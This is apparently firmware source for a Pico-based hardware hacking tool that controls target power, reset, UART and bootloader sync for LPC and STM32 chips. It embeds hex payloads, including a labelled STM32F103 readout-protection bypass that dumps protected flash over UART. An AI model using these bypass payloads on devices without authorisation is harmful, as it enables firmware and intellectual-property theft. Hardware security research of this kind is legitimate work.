#include "config.h"
#include "uart_cli.h"
#include "swd.h"
#include "i2c_bootloader.h"
#include "stm32_breakpoints.h"
#include "glitch.h"
#include "hardware/uart.h"
#include "hardware/gpio.h"
#include "hardware/pwm.h"
#include "hardware/adc.h"
#include "hardware/dma.h"
#include "hardware/structs/padsbank0.h"
#include "pico/stdlib.h"
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

// Shared GPIO IRQ dispatcher — single callback for all GPIO interrupts.
// Pico SDK allows only ONE gpio_set_irq_callback per core; multiple subsystems
// (nRST latch, trace GP22, etc.) register via gpio_irq_register/unregister.
#define GPIO_IRQ_MAX_HANDLERS 4
typedef void (*gpio_irq_fn_t)(uint gpio, uint32_t events);
static struct {
    uint gpio;
    uint32_t events_mask;
    gpio_irq_fn_t fn;
} gpio_irq_handlers[GPIO_IRQ_MAX_HANDLERS];
static int gpio_irq_handler_count = 0;
static bool gpio_irq_callback_installed = false;

static void shared_gpio_irq_callback(uint gpio, uint32_t events) {
    for (int i = 0; i < gpio_irq_handler_count; i++) {
        if (gpio_irq_handlers[i].gpio == gpio &&
            (gpio_irq_handlers[i].events_mask & events)) {
            gpio_irq_handlers[i].fn(gpio, events);
        }
    }
}

static void gpio_irq_register(uint gpio, uint32_t events, gpio_irq_fn_t fn) {
    // Check if already registered for this pin — update in place
    for (int i = 0; i < gpio_irq_handler_count; i++) {
        if (gpio_irq_handlers[i].gpio == gpio && gpio_irq_handlers[i].fn == fn) {
            gpio_irq_handlers[i].events_mask = events;
            gpio_set_irq_enabled(gpio, events, true);
            return;
        }
    }
    if (gpio_irq_handler_count < GPIO_IRQ_MAX_HANDLERS) {
        gpio_irq_handlers[gpio_irq_handler_count].gpio = gpio;
        gpio_irq_handlers[gpio_irq_handler_count].events_mask = events;
        gpio_irq_handlers[gpio_irq_handler_count].fn = fn;
        gpio_irq_handler_count++;
        // Use _with_callback to properly install the shared callback + enable IRQ.
        // On RP2350 gpio_set_irq_callback + irq_set_enabled alone can leave
        // stale pending IRQs that block the ADC polling loop.
        gpio_set_irq_enabled_with_callback(gpio, events, true, shared_gpio_irq_callback);
        gpio_irq_callback_installed = true;
    }
}

static void gpio_irq_unregister(uint gpio, gpio_irq_fn_t fn) {
    for (int i = 0; i < gpio_irq_handler_count; i++) {
        if (gpio_irq_handlers[i].gpio == gpio && gpio_irq_handlers[i].fn == fn) {
            gpio_set_irq_enabled(gpio, gpio_irq_handlers[i].events_mask, false);
            // Compact array
            gpio_irq_handler_count--;
            for (int j = i; j < gpio_irq_handler_count; j++) {
                gpio_irq_handlers[j] = gpio_irq_handlers[j + 1];
            }
            return;
        }
    }
}

// STM32F103 blink payload — blinks PA5 (LD2 on Nucleo-F103RB)
// 608 bytes: vector table + 252-NOP sled + debug-aware blink code
// FAST blink (~100ms) = C_DEBUGEN clear (debug domain POR'd)
// SLOW blink (~500ms) = C_DEBUGEN set (debug domain survived)
// Auto-generated from stm32_payloads/f1/led_payload.S
static const uint8_t f103_led_payload[] = {
  0x00, 0x50, 0x00, 0x20, 0x09, 0x00, 0x00, 0x20, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x11, 0x48, 0x01, 0x68,
  0x51, 0xf0, 0x04, 0x01, 0x01, 0x60, 0x64, 0x22, 0x01, 0x3a, 0xfd, 0xd1,
  0x0e, 0x48, 0x01, 0x68, 0x21, 0xf4, 0x70, 0x01, 0x41, 0xf4, 0x00, 0x11,
  0x01, 0x60, 0x0c, 0x48, 0x01, 0x68, 0x11, 0xf0, 0x01, 0x0f, 0x0c, 0xbf,
  0x0a, 0x4d, 0x0b, 0x4d, 0x0b, 0x4c, 0x20, 0x20, 0x20, 0x60, 0x2a, 0x46,
  0x01, 0x3a, 0xfd, 0xd1, 0x4f, 0xf4, 0x00, 0x10, 0x20, 0x60, 0x2a, 0x46,
  0x01, 0x3a, 0xfd, 0xd1, 0xf3, 0xe7, 0x00, 0x00, 0x18, 0x10, 0x02, 0x40,
  0x00, 0x08, 0x01, 0x40, 0xf0, 0xed, 0x00, 0xe0, 0x80, 0x38, 0x01, 0x00,
  0x80, 0x1a, 0x06, 0x00, 0x10, 0x08, 0x01, 0x40
};

// STM32F103 RDP1 bypass payload — two-stage FPB redirect attack
// 904 bytes: vector table + 252-NOP sled + stage1 (FPB config) + stage2 (UART flash dump)
// Stage 1: Configures FPB to redirect reset vector fetch to SRAM stage2
// Stage 2: Sends "RDP1" + CPUID (4B) + continuous flash via USART1 PA9 @ 115200 baud
// Pico resets target when desired byte count received
// Auto-generated from stm32_payloads/f1/rdp_bypass.S (804 bytes)
static const uint8_t f103_rdp_bypass_payload[] = {
0x00, 0x50, 0x00, 0x20, 0x09, 0x00, 0x00, 0x20, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x3c, 0x48, 0x01, 0x68,
  0x51, 0xf0, 0x04, 0x01, 0x01, 0x60, 0x64, 0x22, 0x01, 0x3a, 0xfd, 0xd1,
  0x39, 0x48, 0x01, 0x68, 0x21, 0xf4, 0x70, 0x01, 0x41, 0xf4, 0x00, 0x11,
  0x01, 0x60, 0x37, 0x48, 0x37, 0x49, 0x08, 0x60, 0x37, 0x48, 0x03, 0x21,
  0x01, 0x60, 0x20, 0x21, 0x41, 0x60, 0x05, 0x21, 0x81, 0x60, 0x35, 0x4c,
  0x20, 0x20, 0x20, 0x60, 0xfe, 0xe7, 0x00, 0xbf, 0xdf, 0xf8, 0xcc, 0xd0,
  0x2c, 0x48, 0x01, 0x68, 0x51, 0xf0, 0x04, 0x01, 0x41, 0xf4, 0x80, 0x41,
  0x01, 0x60, 0x4c, 0xf2, 0x50, 0x32, 0x01, 0x3a, 0xfd, 0xd1, 0x28, 0x48,
  0x01, 0x68, 0x21, 0xf4, 0x70, 0x01, 0x41, 0xf4, 0x00, 0x11, 0x01, 0x60,
  0x28, 0x4c, 0x20, 0x20, 0x20, 0x60, 0x29, 0x48, 0x01, 0x68, 0x21, 0xf0,
  0xf0, 0x01, 0x41, 0xf0, 0xa0, 0x01, 0x01, 0x60, 0x26, 0x48, 0x45, 0x21,
  0x01, 0x60, 0x26, 0x48, 0x42, 0xf2, 0x08, 0x01, 0x01, 0x60, 0xc8, 0x22,
  0x01, 0x3a, 0xfd, 0xd1, 0x23, 0x4c, 0x52, 0x20, 0x00, 0xf0, 0x28, 0xf8,
  0x44, 0x20, 0x00, 0xf0, 0x25, 0xf8, 0x50, 0x20, 0x00, 0xf0, 0x22, 0xf8,
  0x31, 0x20, 0x00, 0xf0, 0x1f, 0xf8, 0x1e, 0x4d, 0x2b, 0x68, 0x18, 0x46,
  0x00, 0xf0, 0x1a, 0xf8, 0x18, 0x0a, 0x00, 0xf0, 0x17, 0xf8, 0x18, 0x0c,
  0x00, 0xf0, 0x14, 0xf8, 0x18, 0x0e, 0x00, 0xf0, 0x11, 0xf8, 0x4f, 0xf0,
  0x00, 0x65, 0x2b, 0x68, 0x18, 0x46, 0x00, 0xf0, 0x0b, 0xf8, 0x18, 0x0a,
  0x00, 0xf0, 0x08, 0xf8, 0x18, 0x0c, 0x00, 0xf0, 0x05, 0xf8, 0x18, 0x0e,
  0x00, 0xf0, 0x02, 0xf8, 0x04, 0x35, 0xf0, 0xe7, 0x00, 0xf0, 0xff, 0x00,
  0x21, 0x68, 0x11, 0xf0, 0x80, 0x0f, 0xfb, 0xd0, 0x60, 0x60, 0x70, 0x47,
  0x18, 0x10, 0x02, 0x40, 0x00, 0x08, 0x01, 0x40, 0x3d, 0x02, 0x00, 0x20,
  0x20, 0x00, 0x00, 0x20, 0x00, 0x20, 0x00, 0xe0, 0x10, 0x08, 0x01, 0x40,
  0x00, 0x50, 0x00, 0x20, 0x04, 0x08, 0x01, 0x40, 0x08, 0x38, 0x01, 0x40,
  0x0c, 0x38, 0x01, 0x40, 0x00, 0x38, 0x01, 0x40, 0x00, 0xed, 0x00, 0xe0,
};

// Diagnostic variant of RDP bypass payload (896 bytes)
// Same as above but stage 2 sends register diagnostics before flash dump
// Protocol: "RDP1" + CPUID(4B) + "DIAG" + 7 regs(28B) + flash bytes
// Regs: DHCSR, DEMCR, FP_CTRL, FP_COMP0, VTOR, FLASH_OBR, RCC_CSR
#include "../stm32_payloads/f1/rdp_bypass_diag_hex.h"
#include "../stm32_payloads/f1/rdp_cleanwake_hex.h"
// STM32F4 RDP1 BYPASS payload — F4 peripheral map + FPB reader trick (F4 blocks
// flash reads from SRAM-executing code under RDP1). Same launch contract as F1.
#include "../stm32_payloads/f4/rdp_bypass_f4_hex.h"
#include "../stm32_payloads/f4/rom_gadget_hex.h"
#include "../stm32_payloads/f1/rdp_literal_hex.h"
#include "../stm32_payloads/f1/rdp_regdump_hex.h"
#include "../stm32_payloads/f1/rdp_resettest_hex.h"

// RDP bypass constants
#define BYPASS_DUMP_ADDR   0x20004000  // Where stage2 dumps flash
#define BYPASS_DUMP_WORDS  64          // 256 bytes = 64 words
#define BYPASS_MAGIC       0xDEADBEEF  // Marker after dump

// Hardware UART for target (UART1)
#define TARGET_UART_ID uart1
#define TARGET_UART_TX_PIN 4  // GP4
#define TARGET_UART_RX_PIN 5  // GP5

// UART configuration
static uint32_t target_baud = 115200;
static bool target_initialized = false;
static bool bootloader_synced = false;

// Target type
static target_type_t current_target_type = TARGET_NONE;

// Response buffer
#define TARGET_RESPONSE_SIZE 512
static char target_response[TARGET_RESPONSE_SIZE];
static uint16_t target_response_pos = 0;
static uint16_t target_response_count = 0;

// Sent data tracking for echo removal
static char sent_data[TARGET_RESPONSE_SIZE];
static uint16_t sent_data_len = 0;

// Reset configuration
static uint8_t reset_pin = 15;
static uint32_t reset_period_ms = 300;  // Default 300ms reset period
static bool reset_active_high = false;
static bool reset_pin_initialized = false;

// Power configuration - 3 pins ganged for ~36mA total (3x 12mA drive)
#define POWER_PIN1  10  // GP10
#define POWER_PIN2  11  // GP11
#define POWER_PIN3  12  // GP12
#define POWER_MASK  ((1u << POWER_PIN1) | (1u << POWER_PIN2) | (1u << POWER_PIN3))
// Settle time after energising a cold target (rail rise + power-on reset) before
// the connect/sync that follows. Applied only on an OFF->ON transition. Tunable.
#define POWER_ON_SETTLE_MS  100
static uint32_t power_cycle_time_ms = 300;  // Default 300ms cycle time
static bool power_pin_initialized = false;

// Power mode: how the GP10/11/12 group is driven (see power_mode_t in config.h).
// INTERNAL (default) = ganged power source; EXTERNAL = GP10 supply, GP11 crowbar, GP12 spare.
static power_mode_t power_mode = POWER_MODE_INTERNAL;
// Crowbar gate polarity in EXTERNAL mode: true = assert HIGH / idle LOW (low-side N-FET),
// false = assert LOW / idle HIGH (high-side P-FET / active-low gate driver).
static bool crowbar_gate_active_high = true;

// GPIO mask that target_power_on/off/cycle actually drive:
//   INTERNAL = the whole ganged group; EXTERNAL = GP10 (supply enable) only,
//   so we never re-grab GP11 (crowbar gate) / GP12 (spare) as power outputs.
static inline uint32_t power_active_mask(void) {
    return (power_mode == POWER_MODE_EXTERNAL) ? (1u << POWER_PIN1) : POWER_MASK;
}

// Force every pin in `mask` to be a driven output, then set it HIGH (on) or LOW
// (off). gpio_set/clr_mask alone only flips the output latch — if a pin had been
// left as an input (e.g. across a mode switch) it would read low regardless, so
// ON/OFF must (re)assert the direction. Makes TARGET POWER ON/OFF work in both
// power modes from any prior pin state.
static void power_drive(uint32_t mask, bool on) {
    for (uint pin = 0; pin < 32; pin++) {
        if (mask & (1u << pin)) {
            gpio_set_dir(pin, GPIO_OUT);
        }
    }
    if (on) gpio_set_mask(mask); else gpio_clr_mask(mask);
}

// Debug mode
static bool debug_mode = false;

// Transparent bridge timeout (milliseconds)
static uint32_t bridge_timeout_ms = 50;

// Forward declarations (implemented below)
void target_uart_init(uint8_t tx_pin, uint8_t rx_pin, uint32_t baud);
void target_uart_send_byte(uint8_t byte);
void target_reset_config(uint8_t pin, uint32_t period_ms, bool active_high);
void target_uart_clear_response(void);
void target_uart_print_response_hex(void);

// UART RX interrupt handler
void target_uart_irq_handler(void) {
    extern void uart_cli_printf(const char *format, ...);
    extern void uart_cli_send(const char *str);

    while (uart_is_readable(TARGET_UART_ID)) {
        uint8_t byte = uart_getc(TARGET_UART_ID);

        // Display received byte in debug mode
        if (debug_mode) {
            uart_cli_printf("[RX] %02X", byte);
            if (byte >= 32 && byte < 127) {
                uart_cli_printf(" '%c'", byte);
            }
            uart_cli_send("\r\n");
        }

        // Store in response buffer
        if (target_response_pos < TARGET_RESPONSE_SIZE - 1) {
            target_response[target_response_pos++] = byte;
            target_response_count++;
        }
    }
}

void target_init(void) {
    // Initialize reset pin with defaults on startup
    // This ensures TARGET RESET works without explicit configuration
    target_reset_config(reset_pin, reset_period_ms, reset_active_high);

    // Initialize power pins - ganged for higher current. Boot default is OFF
    // (de-energized) for both power modes: the boot mode is INTERNAL and the
    // whole GP10/11/12 group is driven LOW. The target is energized on demand
    // by TARGET POWER ON, or automatically by the auto-power-on at the
    // TARGET SYNC / SWD CONNECT choke points. (Switching modes honours this
    // off state, so EXTERNAL also comes up de-energized.)
    const uint8_t power_pins[] = {POWER_PIN1, POWER_PIN2, POWER_PIN3};
    for (int i = 0; i < 3; i++) {
        gpio_init(power_pins[i]);
        gpio_set_dir(power_pins[i], GPIO_OUT);
        gpio_set_drive_strength(power_pins[i], GPIO_DRIVE_STRENGTH_12MA);
    }
    gpio_clr_mask(POWER_MASK);  // boot default OFF (de-energized)
    power_pin_initialized = true;

    // Pre-initialize and deinit UART1 to ensure clean state after Pico boot
    // This works around an issue where first UART TX after boot fails
    gpio_init(TARGET_UART_TX_PIN);
    gpio_init(TARGET_UART_RX_PIN);
    uart_init(TARGET_UART_ID, 115200);
    uart_set_format(TARGET_UART_ID, 8, 1, UART_PARITY_NONE);
    gpio_set_function(TARGET_UART_TX_PIN, GPIO_FUNC_UART);
    gpio_set_function(TARGET_UART_RX_PIN, GPIO_FUNC_UART);
    sleep_ms(10);
    uart_deinit(TARGET_UART_ID);
    gpio_deinit(TARGET_UART_TX_PIN);
    gpio_deinit(TARGET_UART_RX_PIN);
}

// Helper function to wait for and read a response with timeout
static bool wait_for_response(const char *expected, uint32_t timeout_ms) {
    uint32_t start = to_ms_since_boot(get_absolute_time());
    size_t expected_len = strlen(expected);
    size_t match_pos = 0;

    while (to_ms_since_boot(get_absolute_time()) - start < timeout_ms) {
        if (uart_is_readable(TARGET_UART_ID)) {
            uint8_t byte = uart_getc(TARGET_UART_ID);

            // Display received byte in debug mode
            if (debug_mode) {
                uart_cli_printf("[RX] %02X", byte);
                if (byte >= 32 && byte < 127) {
                    uart_cli_printf(" '%c'", byte);
                }
                uart_cli_send("\r\n");
            }

            // Store in response buffer
            if (target_response_pos < TARGET_RESPONSE_SIZE - 1) {
                target_response[target_response_pos++] = byte;
                target_response_count++;
            }

            // Check if it matches expected response
            if (byte == expected[match_pos]) {
                match_pos++;
                if (match_pos == expected_len) {
                    return true;  // Found complete match
                }
            } else {
                match_pos = 0;  // Reset match position
            }
        }
        sleep_us(100);  // Small delay to avoid busy waiting
    }

    return false;  // Timeout
}

void target_set_type(target_type_t type) {
    current_target_type = type;
    bootloader_synced = false;
}

target_type_t target_get_type(void) {
    return current_target_type;
}

bool target_enter_bootloader(uint32_t baud, uint32_t crystal_khz) {
    if (current_target_type == TARGET_NONE) {
        uart_cli_send("ERROR: No target type set. Use TARGET <LPC|STM32> first\r\n");
        return false;
    }

    // Initialize UART1 on GP4/GP5 with specified baud
    target_uart_init(TARGET_UART_TX_PIN, TARGET_UART_RX_PIN, baud);

    // Disable UART interrupt during bootloader communication to avoid race conditions
    // We use blocking reads during bootloader sync, so interrupts would interfere
    uart_set_irq_enables(TARGET_UART_ID, false, false);

    // Clear any stale data from UART RX FIFO that may have accumulated
    while (uart_is_readable(TARGET_UART_ID)) {
        uart_getc(TARGET_UART_ID);
    }

    // Target-specific bootloader entry
    switch (current_target_type) {
        case TARGET_LPC:
        case TARGET_LPC_CM:
            uart_cli_send("Entering LPC ISP bootloader mode...\r\n");

            // Clear response buffer
            target_uart_clear_response();

            // Small delay to ensure target UART is fully ready after reset and UART init
            sleep_ms(10);

            // 1. Send '?' (0x3F) - sync character
            uart_cli_send("Sending '?'...\r\n");
            target_uart_send_byte('?');

            // 2. Wait for 'Synchronized\r\n' response
            uart_cli_send("Waiting for 'Synchronized'...\r\n");
            if (!wait_for_response("Synchronized\r\n", 1000)) {
                uart_cli_send("ERROR: Timeout waiting for 'Synchronized'\r\n");
                return false;
            }

            // 3. Send "Synchronized\r\n"
            uart_cli_send("Sending 'Synchronized'...\r\n");
            const char *sync_msg = "Synchronized\r\n";
            for (int i = 0; sync_msg[i] != '\0'; i++) {
                target_uart_send_byte(sync_msg[i]);
            }

            // 4. Wait for "OK\r\n" response
            uart_cli_send("Waiting for OK...\r\n");
            if (!wait_for_response("OK\r\n", 1000)) {
                uart_cli_send("ERROR: Timeout waiting for first OK\r\n");
                return false;
            }

            // 5. Send crystal frequency
            char freq_msg[16];
            snprintf(freq_msg, sizeof(freq_msg), "%u\r\n", crystal_khz);
            uart_cli_printf("Sending crystal frequency (%u kHz)...\r\n", crystal_khz);
            for (int i = 0; freq_msg[i] != '\0'; i++) {
                target_uart_send_byte(freq_msg[i]);
            }

            // 6. Wait for second "OK\r\n"
            uart_cli_send("Waiting for final OK...\r\n");
            if (!wait_for_response("OK\r\n", 1000)) {
                uart_cli_send("ERROR: Timeout waiting for second OK\r\n");
                return false;
            }

            // 7. Enable echo with "A 1\r\n" (needed for UART glitch triggering)
            uart_cli_send("Enabling echo mode...\r\n");
            const char *echo_on = "A 1\r\n";
            for (int i = 0; echo_on[i] != '\0'; i++) {
                target_uart_send_byte(echo_on[i]);
            }

            // Wait for echo OK
            if (!wait_for_response("0\r\n", 1000)) {
                uart_cli_send("WARNING: Timeout waiting for echo confirmation\r\n");
            }

            uart_cli_send("LPC ISP sync complete. Echo mode enabled.\r\n");
            break;

        case TARGET_STM32F1:
        case TARGET_STM32F3:
        case TARGET_STM32F4:
        case TARGET_STM32L4: {
            uart_cli_send("Entering STM32 bootloader mode...\r\n");
            uart_cli_send("Sending 0x7F for STM32 sync...\r\n");
            // Send 0x7F for STM32 bootloader sync
            target_uart_send_byte(0x7F);

            // Wait for ACK (0x79) or NACK (0x1F) with timeout
            uint32_t start = to_ms_since_boot(get_absolute_time());
            uint32_t timeout_ms = 1000;  // 1 second timeout for bootloader response
            bool got_response = false;

            while (to_ms_since_boot(get_absolute_time()) - start < timeout_ms) {
                if (uart_is_readable(TARGET_UART_ID)) {
                    uint8_t byte = uart_getc(TARGET_UART_ID);
                    if (debug_mode) {
                        uart_cli_printf("[RX] %02X", byte);
                        if (byte >= 32 && byte < 127) {
